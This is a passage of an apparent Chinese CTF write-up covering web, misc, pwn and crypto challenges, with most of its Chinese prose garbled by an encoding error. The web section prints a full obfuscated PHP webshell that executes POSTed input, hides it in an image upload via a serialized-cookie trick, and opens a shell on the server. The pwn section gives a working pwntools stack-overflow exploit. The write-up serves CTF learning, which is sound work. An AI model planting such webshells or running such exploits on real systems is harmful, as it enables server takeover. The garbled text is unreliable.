\"../public/upload/md5(user)/xxx.php\"; $register = new Register(); $register-\u003eregisted = false; $register-\u003echecker = $profile; echo urlencode(base64_encode(serialize($register)));   ä¸è¿‡å¤ç°æ—¶ä¹Ÿé‡åˆ°äº†ä¸å°‘éº»çƒ¦ï¼Œé€šè¿‡ä»¥ä¸‹ä»£ç æ„é€ payloadç„¶åå»æ›¿ä»£æˆ‘ä»¬çš„Cookieï¼Œåˆ·æ–°åå¾—åˆ°æˆ‘ä»¬ä¿®æ”¹åç¼€çš„phpå›¾ç‰‡é©¬ã€‚\nä¸è¿‡åœ¨ç”¨æˆ·å·²ç™»å½•æ—¶æ”¹Cookieæ—¶æ²¡ç”¨ï¼Œè¦ç­‰åˆ°é€€å‡ºè´¦æˆ·åˆ°ç™»é™†ç•Œé¢æ—¶è®¾ç½®æ–°å»ºCookieï¼Œå†åˆ·æ–°å¾—åˆ°å¦‚ä¸‹ç•Œé¢è¯´æ˜æˆåŠŸäº†\næ­¤æ—¶ï¼Œå»è®¿é—®url/upload/å³å¯çœ‹åˆ°æˆ‘ä»¬ä¿®æ”¹çš„phpåç¼€çš„æ–‡ä»¶ï¼ŒåŒæ—¶åœ¨ä¸Šä¼ åšphpå›¾ç‰‡é©¬æ—¶ä¹Ÿé‡åˆ°äº†é—®é¢˜\nä»¥ä¸‹æ˜¯ä¸­å›½èšå‰‘ç”Ÿæˆçš„å…æ€é©¬ï¼Œå’Œpngå›¾ç‰‡æ‹¼æ¥åœ¨ä¸€èµ·ä¸Šä¼ åå‘ç°æ— æ³•è§£æ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  \u003c?php class ISGM { function MaRC() { $XYUg = \"\\xf9\" ^ \"\\x98\"; $LaqL = \"\\x57\" ^ \"\\x24\"; $LXlg = \"\\xe0\" ^ \"\\x93\"; $kYoS = \"\\x7a\" ^ \"\\x1f\"; $zzTF = \"\\xaf\" ^ \"\\xdd\"; $hteZ = \"\\x9f\" ^ \"\\xeb\"; $DBlL =$XYUg.$LaqL.$LXlg.$kYoS.$zzTF.$hteZ; return $DBlL; } function __destruct(){ $LlRV=$this-\u003eMaRC(); @$LlRV($this-\u003eSo); } } $isgm = new ISGM(); @$isgm-\u003eSo = isset($_GET['id'])?base64_decode($_POST['pass']):$_POST['pass']; ?\u003e  ç„¶åå°è¯•è‡ªå·±å†™äº†ä¸€ä¸ªï¼Œæ‹¼æ¥åœ¨ä¸€èµ·ä¹Ÿæ²¡æœ‰èº²å¼€è¿™ä¸ªé”™è¯¯çš„å„è¿\næŸ¥çœ‹å›¾ç‰‡é©¬çš„æºç å‘ç°å¦‚ä¸‹ï¼š\nå¯èƒ½æ˜¯pngæ–‡ä»¶å°¾å’Œphpå¤´éƒ¨æ‹¼æ¥ï¼Œå¯¼è‡´ä¸€äº›è½¬ä¹‰é—®é¢˜ï¼Œphpå¤±å»å¤´éƒ¨\u003c?phpå¯¼è‡´è§£æphpè§£æå¤±è´¥\nç„¶åå°è¯•ç”¨jpgæ–‡ä»¶å»åšä¸€ä¸ªå›¾ç‰‡é©¬ã€ä¸Šä¼ ï¼Œæœç„¶æˆåŠŸäº†\nç„¶åç”¨ä¸­å›½èšå‰‘è¿ä¸ŠæœåŠ¡å™¨ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag\nMisc 0x01 Gif  é¢˜ç›®æè¿°ï¼š Gifä½ çœ¼ç¥å¤Ÿå¿«å—ï¼Ÿ\n ç”¨StegSolve.jar æ‰“å¼€ç›®æ ‡gifï¼Œå³å¯é€å¸§æŸ¥çœ‹ï¼Œä¸€å…±å…­å¸§ï¼Œ4å¸§éƒ½æ˜¯flagéœ€è¦è‡ªå·±æ‹¼æ¥ã€‚\næ‹¼æ¥å®Œå¾—åˆ°flagSDUCTF{Gif_is_very_interesting}\n0x02 PDF  é¢˜ç›®æè¿°ï¼š pdfé‡Œé¢è—äº†å•¥ï¼Ÿ\n è·Ÿæ”»é˜²ä¸–ç•Œçš„ä¸€é¢˜miscä¸€æ ·ï¼Œéšä¾¿æ‰¾ä¸ªç½‘ç«™å°†pdfè½¬docï¼Œç„¶åæŠŠå›¾ç‰‡æ‹–å¼€flagå°±è—åœ¨ä¸‹é¢ã€‚\næˆ–è€…ç”¨ä¸€äº›pdfç¼–è¾‘å™¨ä¹Ÿåšçš„åˆ°ã€‚\n0x03 ä»Šæ™šæœˆè‰²ç¾å—  é¢˜ç›®æè¿°ï¼š å°ç‹åŒå­¦åœ¨è·¯ä¸Šèµ°è·¯ï¼Œçªç„¶å‘ç°å°æœ±åŒå­¦å‘äº†ä¸€æ¡æœ‹å‹åœˆï¼Œé…å›¾æ˜¯ç¾ç¾çš„æœˆäº®ã€‚äºæ˜¯å°ç‹åŒå­¦å¿ƒè¡€æ¥æ½®ï¼Œæå‡ºæ‰‹æœºä¹Ÿæ‹äº†ä¸€å¼ ç…§ç‰‡ã€‚ä½ è§‰å¾—æœˆäº®æœ‰ä»€ä¹ˆå¥‡æ€ªçš„åœ°æ–¹å—ï¼Ÿ\n ç”¨StegSolveæŸ¥çœ‹ï¼ŒåŸä»¥ä¸ºæ˜¯åŠ å¯†ï¼Œï¼Œæ²¡æƒ³åˆ°æ˜¯è—åœ¨ä¸åŒè‰²å·®å±‚ã€‚\n0x04 è‹å­å¬å£°éŸ³  é¢˜ç›®æè¿°ï¼š\n æˆ‘è¿™è¾¹ç”¨çš„æ˜¯Audacityï¼Œæ®è¯´AUä¹Ÿå¯ä»¥æŸ¥çœ‹ï¼Œæ ¹æ®é¢˜ç›®æè¿°ï¼ŒéŸ³é¢‘åº”è¯¥ä¸æ˜¯éšå†™ï¼Œè€Œæ˜¯è—åœ¨é¢‘è°±å›¾é‡Œ\næŸ¥çœ‹é¢‘è°±å›¾å°±å¯å¾—flag\n0x05 äºŒè¿›åˆ¶  é¢˜ç›®æè¿°ï¼šçœ‹äºŒè¿›åˆ¶ä½ èƒ½çœ‹å‡ºä¸ªä»€ä¹ˆèŠ±æ ·æ¥ï¼Ÿ\n åŸæœ¬æ²¡æœ‰æ€è·¯çš„ï¼Œå°†æ–‡ä»¶æ‰”è¿›binwalkå’Œforemostè·‘æ²¡è·‘å‡ºä¸œè¥¿ï¼Œç”¨lessï¼Œmoreæ²¡è·‘å‡ºæ¥ï¼Œæœ€åè‡ªæš´è‡ªå¼ƒç”¨catä¸€è¯•ï¼Œflagå°±å‡ºæ¥äº†ï¼Œæˆ‘è¿˜ä»¥ä¸ºæœ‰ä»€ä¹ˆéšå†™emmmmmmmmmm\nç»“æœæ˜¯ä¸€å †0åŠ ä¸Šflag\nå¦ä¸€ç§åŠæ³•ï¼Œç”¨010editoræ‰“å¼€ï¼Œç›´æ¥æœç´¢flagï¼Œå¾—åˆ°flag\n0x06 å¥‡æ€ªçš„å‹ç¼©æ–‡ä»¶  é¢˜ç›®æè¿°ï¼š evaè¯´å¥¹ç»™tomå‘äº†ä¸€å¼ äºŒç»´ç ï¼Œä½†æ˜¯Tomæ¥æ”¶æ–‡ä»¶åè§‰å¾—ä¸å¤ªå¯¹åŠ²ã€‚\n æ‰“å¼€é™„ä»¶PIC.zipï¼Œå‘ç°é‡Œé¢æœ‰å››ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œå‘ç°è§£å‹ä¸äº†ã€‚æ‰”binwalkè·‘ä¸€æ³¢å‘ç°æ˜¯jpegï¼Œç›´æ¥æ”¹åç¼€å¾—åˆ°jpgå›¾ç‰‡ã€‚\nå››ä¸ªå‹ç¼©æ–‡ä»¶åˆ†åˆ«æ˜¯QRcodeå››ç­‰åˆ†ï¼Œç”¨ç”»å›¾æŠŠä»–ä»¬æ‹¼ä¸€èµ·ï¼Œè·å¾—ä¸€å¼ å®Œæ•´çš„äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flagã€‚\n0x07 zip  é¢˜ç›®æè¿°ï¼š è¿™æ˜¯ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œä½ èƒ½æ‰“å¼€å®ƒå—ï¼Ÿ\n å‘ç°æ²¡æœ‰æˆªå›¾ï¼Œå°±è¯´ä¸‹æ€è·¯æŠŠï¼Œè½¬æ‰‹å°±å»æŠŠå›¾æˆªäº†ï¼Œæ˜¾ç¤ºä¸€ä¸ªpassword.zipä¼ªåŠ å¯†ï¼Œç”¨ZipCenOpè§£å¼€ä¼ªåŠ å¯†ï¼Œçœ‹åˆ°é‡Œé¢è¿˜æœ‰ä¸€ä¸ªå‹ç¼©åŒ…\nä½†æ˜¯å‹ç¼©åŒ…é‡Œé¢æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œå†™ç€flagä¸åœ¨è¿™\näºæ˜¯å°±æŠŠé‡Œé¢é‚£ä¸ªzipæ‹–è¿›010editoræŸ¥çœ‹ï¼Œå‘ç°æ˜¯éšå†™ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç›´æ¥çœ‹åˆ°flagï¼Œå¤åˆ¶æäº¤å°±å®Œäº†\n0x08 çŒœæ‹³  é¢˜ç›®æè¿°ï¼š çŒœæ‹³ï¼Œä½ èƒ½èµ¢è¿‡æœºå™¨äººå—ï¼Ÿ\n åˆæ˜¯æ²¡æœ‰æ€è·¯çš„pwnï¼Œä¸Šç½‘æœç´¢å¾—çŸ¥pythonæœ‰ä¸ªpwnåº“å¯ä»¥è®¡ç®—éšæœºæ•°ç§å­ï¼Œæ—¢ç„¶æ˜¯çŒœï¼Œæˆ‘å°±è‡ªå·±æ‰¾ä¸€æ³¢è§„å¾‹ã€‚\nrobot: bsj sjb jbs I can win: jbs bsj sjb æ‰¾è§„å¾‹å¾—çŸ¥å¯¹é¢å‡ºæ‹³æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œè‡ªå·±æ‰‹åŠ¨è§£ä¸€æ³¢å¾—åˆ°flag\n(ç«Ÿç„¶æ”¹æˆMiscäº†ï¼Œæœç„¶ä¸æ˜¯ä¸€é“pwné¢˜)\nPWN 0x01 Simple nc  é¢˜ç›®æè¿°ï¼š ä½ ä¼šä½¿ç”¨ncå‘½ä»¤å—? å¯èƒ½æ˜¯å…¨çƒæœ€ç®€å•çš„pwné¢˜ç›®\n è™½ç„¶pwnè¿˜æ²¡å…¥é—¨ï¼Œä¸è¿‡è¿™ç¡®å®æ˜¯æœ€ç®€å•å¾—pwnã€‚\nç†Ÿæ‚‰ncå³netcatå‘½ä»¤å³å¯ï¼Œnetcat ctf.sec.sdunet.cn 38849ç›´æ¥è¿ä¸Šé€šè¿‡ls,catå‘½ä»¤è¯»å–flag\n0x02 StackOverflow  é¢˜ç›®æè¿°ï¼š ä½œä¸ºç¨‹åºå‘˜æ€ä¹ˆä¼šä¸çŸ¥é“ https://stackoverflow.com/\n ä¸€é“åŸºæœ¬çš„æ ˆæº¢å‡ºé¢˜ç›®ï¼Œä½†æ˜¯ä¸­é—´çš„ç¼–ç é—®é¢˜ä»¤äººçƒ¦èº\nç”¨IDAé€†å‘ï¼Œçœ‹åˆ°ä¸»å‡½æ•°ã€‚\nè¿›å…¥hello()å‡½æ•°å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼šå…¶ä¸­æœ‰getå‡½æ•°\næ ¹æ®ctf-wikiçš„pwnçš„åŸºæœ¬æ•™ç¨‹çš„getæ ˆæº¢å‡ºå°±å¯ä»¥åšå‡ºæ¥\nè¿˜åœ¨å…¶ä¸­æ‰¾åˆ°successï¼Œè¿™åº”è¯¥å°±æ˜¯æˆ‘ä»¬getshellçš„å‡½æ•°\næ ¹æ®ctf-wikiæ„é€ exp\n1 2 3 4 5 6 7 8 9 10 11  from pwn import * sh = remote(\"ctf.sec.sdunet.cn\",\"38268\") #sh = process(./stackoverflow) success_addr=0x08048486 #payload = 'a' * 0x14 + 'bbbb' + p32(success_addr) payload = 'a' * 0x14 + 'bbbb' + '\\x86\\x84\\x04\\x08' print(p32(success_addr) #out\u003e\u003e\u003eb'\\x86\\x84\\x04\\x08' sh.sendline(payload) sh.interactive()   ç”¨pwntoolsç›´æ¥æ„é€ expï¼Œgetshellï¼Œè·å¾—flag\nå…¶ä¸­é‡åˆ°äº†ä¸€ä¸ªç¼–ç é—®é¢˜ï¼š\nå› ä¸ºåœ°å€ç”¨p32è½¬æˆåœ°å€å½¢å¼ä¸ºb'\\x86\\x84\\x04\\x08æ‰€ä»¥ä¸€ç›´ç¼–ç ä¸æˆåŠŸï¼Œå¯¼è‡´payloadè¿æ¥å¤±è´¥ä¸èƒ½æˆåŠŸgetshell\nåœ¨decodeæ—¶ä½¿ç”¨'ignore'æ¨¡å¼ï¼Œ\\x86\\x84ä¸¤ä¸ªå­—ç¬¦ä¼šè¢«å¿½ç•¥ï¼Œè¯´æ˜æ˜¯éæ³•å­—ç¬¦ã€‚\nä¸æ‡‚æ˜¯å•¥é”™è¯¯ï¼ï¼\npwnè‡ªå¸¦çš„flatæ–¹æ³•å¯ä»¥æ‹¼æ¥å­—ç¬¦ä¸²é¿å¼€strè¿æ¥çš„é”™è¯¯ï¼Œflatæ–¹æ³•ä¼ å…¥ä¸€ä¸ªåˆ—è¡¨list[]ï¼Œlisté‡Œæ”¾æ‰€éœ€è¦æ‹¼æ¥çš„å¯¹è±¡ ï¼š payload = flat(['a'*24,'bbbb',addr])\nè¿˜æœ‰æ‰§è¡Œelfæ–‡ä»¶ï¼Œç”±äºæˆ‘çš„ç³»ç»Ÿæ˜¯64bitUbuntuï¼Œæ‰§è¡Œ32bitELFæ–‡ä»¶éœ€è¦å®‰è£…ä»¥ä¸‹åŒ…\n1  sudo apt install lib32ncurses5 lib32z1   Crypto 0x01 Base  é¢˜ç›®æè¿°ï¼š[https://baike.baidu.com/item/è´æ–¯/]\nå¥‡æ€ªçš„é“¾æ¥\n é¢˜ç›®ç›´æ¥ç»™äº†ä¸¤ä¸ªé“¾æ¥ï¼Œä¸è¿‡ç¬¬äºŒä¸ªå¦‚ä¸‹\nZmxhZ3tiYXNlNjRfaXNfbm90X2FuX2VuY3J5cHRpb25fbWV0aG9kfQ ç›´æ¥æ‰”base64å»è§£ç ï¼Œå¾—åˆ°flagï¼šflag{base64_is_not_an_encryption_method}\n0x02 è¯¡å¼‚çš„æ•°å­—  é¢˜ç›®æè¿°ï¼šæ‘©åŒå­¦åšctfåˆ°æ·±å¤œï¼Œç‚¹å¼€è¿™é“é¢˜å´å‘ç°ç½‘å®‰å®éªŒå®¤é‡Œçš„ç¯çªç„¶æœ‰è§„å¾‹çš„æ—¶æš—æ—¶äº®ï¼Œååˆ†è¯¡å¼‚ã€‚éš¾é“è¿™ä»£è¡¨ç€ä»€ä¹ˆï¼Ÿ ä»–ç”¨é¢¤æŠ–çš„åŒæ‰‹è®°ä¸‹äº†ä¸‹é¢è¿™æ®µæ–‡å­—ã€‚ä½ èƒ½å‘ç°å…¶ä¸­çš„å¥¥ç§˜å—ï¼Ÿ 11 111 010 000 0 11111 00 000 11111 00 10 1 0 010 0 000 1 00 10 110\nflagæ ¼å¼ä¸ºsductf{xxxxxxxxxx}\n æ—¢ç„¶æ˜¯æ‘©åŒå­¦ï¼Œé‚£ä¹ˆç›´æ¥æ”¾è«æ–¯è§£ç å³å¯ï¼Œå­—ç¬¦ä¸²åˆ©ç”¨pythonè„šæœ¬çš„str.replae()æ–¹æ³•æ›¿æ¢æˆ.-å³å¯ï¼Œå³1å¯¹åº”-ï¼Œ2å¯¹åº”.ï¼Œè§£å¾—flagã€‚\n0x03 ä¹å®«æ ¼  é¢˜ç›®æè¿°ï¼šæ— è®ºæ˜¯æœç‹—è¾“å…¥æ³•è¿˜æ˜¯ç™¾åº¦è¾“å…¥æ³•è¿˜æ˜¯QQè¾“å…¥æ³•è¿˜æ˜¯è®¯é£è¾“å…¥æ³•è¿˜æ˜¯è°·æ­Œè¾“å…¥æ³•è¿˜æ˜¯..........éƒ½æœ‰9å®«æ ¼ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜ç›®ç‚’é¸¡ç®€å•\n7426366432983 è§£å‡ºæ¥çš„æ˜æ–‡èµ‹å€¼ç»™x\nflagä¸º flag{ md5(x+md5(x,16), 32) } (ç»“æœæ²¡æœ‰ç©ºæ ¼ï¼Œx+ è¡¨ç¤ºçš„æ˜¯xä¸å¦ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥ï¼‰\n ä¸€ä¸²æ•°å­—é€šè¿‡ç»å…¸çš„ä¹å®«æ ¼æ‰“å‡ºæ¥æ˜¯å±±ä¸œå¤§å­¦å››ä¸ªå­—\nç„¶åé€šè¿‡pythonçš„hashlib.md5()å°±å¯ä»¥ç®—å‡ºflag\nmd5çš„16ä½ç™¾åº¦å¾—çŸ¥æ˜¯æˆªå–32ä½md5ä¸­é—´çš„16ä½\n1 2 3 4  import hashlib s = \"å±±ä¸œå¤§å­¦\" mobj = hashlib.md5(s.encode('utf-8')).hexdigest()[8:24] ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest()   1 2 3 4 5 6 7 8  \u003e\u003e\u003e import hashlib \u003e\u003e\u003e s = \"å±±ä¸œå¤§å­¦\" \u003e\u003e\u003e mobj = hashlib.md5(s.encode('utf-8')).hexdigest()[8:24] \u003e\u003e\u003e mobj 'f09383b061bb3c9f' \u003e\u003e\u003e ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest() \u003e\u003e\u003e ans 'ecf506190946c4e8d06d53e14191329e'   0x04 é”®ç›˜è¿½è¸ª  é¢˜ç›®æè¿°ï¼šé”®ç›˜æ˜¯ä¸ªç”»æ¿ï¼Œå¦‚æœä½ çš„é”®ç›˜æœ‰ç¯å…‰åº”è¯¥ä¼šç®€å•ç‚¹\nrfsdsz tfvbhy ijnm ijnm tfvbhy wsxdcft vgyhujm hjuygbn\nè¿˜åŸå‡ºæ˜æ–‡åè¯·è‡ªè¡Œæ‹¼æ¥flag{}\n ä¹‹å‰åœ¨æˆéƒ½å¤§å­¦çš„ctfæ¯”èµ›ä¸­çœ‹è¿‡é”®ç›˜å¯†ç ï¼Œçœ‹é¢˜ç›®æè¿°åº”è¯¥æ˜¯æŒ‰é”®ç›˜ä½ç½®ç”»å‡ºå­—æ¯æ¥ï¼Œä½†æ˜¯æˆ‘æ¯”åˆ’å‡ºolloWMeåä¸ƒä¸ªå­—æ¯ï¼Œç¡¬æ˜¯æ²¡çœ‹æ‡‚ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å•¥ï¼Œç„¶åå°†é‚£äº›å­—ç¬¦æ‰”å»ç™¾åº¦ï¼Œæœç´¢å¾—åˆ°çš„æ—¶FollowMeï¼Œå°è¯•ä¸€æ³¢ï¼Œæœç„¶æ˜¯flagã€‚\nï¼ˆè‡³ä»Šä¸ºæ­¢æˆ‘éƒ½ä¸çŸ¥é“ç¬¬ä¸€ä¸ªä¸ºå•¥æ—¶F\n0x05 å®‡å®™ç»ˆæé—®é¢˜  é¢˜ç›®æè¿°ï¼šDo you know The Answer to the Ultimate Question of Life, The Universe, and Everything?\nGive me 3 integers, x, y, and z, such that x^3 + y^3 + z^3 = 42\nå¾—åˆ°xã€yã€zåè¯·æŠŠå®ƒä»¬ä¹˜èµ·æ¥ï¼Œç„¶ååŒ…è£¹ä¸Šflag{}\n ç›´æ¥ç™¾åº¦å¾—åˆ°è§£å¦‚ä¸‹ï¼Œæ‰”è¿›pythonè·‘ä¸€æ³¢å¤§æ•°ä¹˜æ³•\n1 2 3 4 5 6 7  \u003e\u003e\u003e x = -80538738812075974 \u003e\u003e\u003e y = 80435758145817515 \u003e\u003e\u003e z = 12602123297335631 \u003e\u003e\u003e x**3+y**3+z**3 42 \u003e\u003e\u003e x*y*z -81639006040518590050493906720365515701570561538910   0x06 ç§˜å¯†æŠ¥æ–‡  é¢˜ç›®æè¿°ï¼šåœ¨ç¬¬ä¸€æ¬¡ä¸–ç•Œå¤§æˆ˜æœŸé—´ï¼Œæ³•å›½é™†å†›æ•è·åˆ°ä¸€ä»½ç§˜å¯†æŠ¥æ–‡ï¼Œäº¤ç»™ä¸­å°‰Georges Painvinå°è¯•ç ´è§£ã€‚\næŠ¥æ–‡å†…å®¹å¦‚ä¸‹ï¼š XX DF GG AF XD XF AF XD XF AF AG DD AF GF DX XF XD\nè§£å¯†ä¹‹åè¯·è‡ªè¡Œæ‹¼æ¥flag{}æäº¤\n æˆ‘è®°å¾—ä¹‹å‰åšé¢˜æ—¶æœ‰çœ‹è§è¿‡ç±»ä¼¼å¯†ç ï¼Œä½†æ˜¯å¿˜äº†æ˜¯å•¥ã€‚\næœ€æ˜æ˜¾çš„ï¼Œå…ˆæŠŠä¸­å°‰åå­—Georges Painvinç™¾åº¦ä¸€æ³¢ï¼Œå¾—çŸ¥æ—¶ADFGVXå¯†ç å¯¹ç…§å¯†ç è¡¨ï¼Œè§£å¾—flagï¼šflag{youarearealhacker}\n0x07 ok?  é¢˜ç›®æè¿°ï¼š\nå°±é—®ä½ okä¸ok\nOok. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook.\n æ—¢ç„¶æ˜¯å¯†ç é¢˜ï¼Œé‚£å°±ç™¾åº¦å‘—\næœç´¢çš„æ˜¯okå¯†ç ï¼Œæ–‡ç« å’Œè½¬æ¢çš„githubåœ°å€å¦‚ä¸‹\n https://www.splitbrain.org/services/ook\nhttps://github.com/splitbrain/ook\n ä¸è¿‡æœ‰ç‚¹ä¸å¯¹ï¼Œè§‚å¯Ÿæ ·ä¾‹å¯†ç ï¼ŒæŠŠ#æ¢æˆ?ï¼Œè§£å¾—flag\n0x08 ä»€ä¹ˆå¯†ç ï¼Ÿ  é¢˜ç›®æè¿°ï¼š\nEVAç»™Tomå‘äº†ä¸€å°é‚®ä»¶ï¼Œä½†æ˜¯Tomå´çœ‹ä¸æ‡‚EVAæƒ³è¡¨è¾¾ä»€ä¹ˆï¼Œè¯·ä½ å‘Tomè§£é‡Šä¸€ä¸‹è¿™å°é‚®ä»¶\nå‘ä»¶äººï¼šEVA æ”¶ä»¶äººï¼šTom Pxevhfxmhietrpbmamablztfx\nflagæ ¼å¼ï¼šsductf{+.}\nThe answer is related to my favorite movie.\n å¯†ç å¯èƒ½åšç€åšç€å¿ƒæ€å´©äº†ï¼Œä¸å°å¿ƒæŠŠCryptoå½“miscåšäº†\næŠŠå›¾ç‰‡ä¸‹ä¸‹æ¥ï¼Œæ²¡æ³¨æ„åˆ°å›¾ç‰‡ä¸Šåˆ°Cesarï¼Œbinwalkè·‘ä¸€æ³¢å›¾ç‰‡ï¼Œå‘ä¸‹é‡Œé¢è¿˜æœ‰ä¸€ä¸ªzlibï¼Œç™¾åº¦è§£zlibï¼Œç„¶åç–¯ç‹‚æŠ¥é”™ï¼Œè´¼éš¾å—ï¼Œç„¶åçœ‹äº†hintï¼Œå¾—çŸ¥å‡¯æ’’å¯†ç \néš¾å— -600point\nä½ç§»å‡ ä½å¿˜äº†ã€‚\nAnd ååˆ†çœŸå®ï¼Œéƒ½æŠŠé¡ºåºæ”¾æˆ‘TODO Listä¸‹äº†ï¼Œå¦ˆè€¶\nä»€ä¹ˆå¯†ç ï¼Ÿhttps://blog.csdn.net/qq_40574571/article/details/80164981\n0x09 Mix  é¢˜ç›®æè¿°ï¼šè§£å¼€å¥¹ï¼Œflagå°±æ˜¯ä½ çš„äº†\nJiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzM7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzE7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzI7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4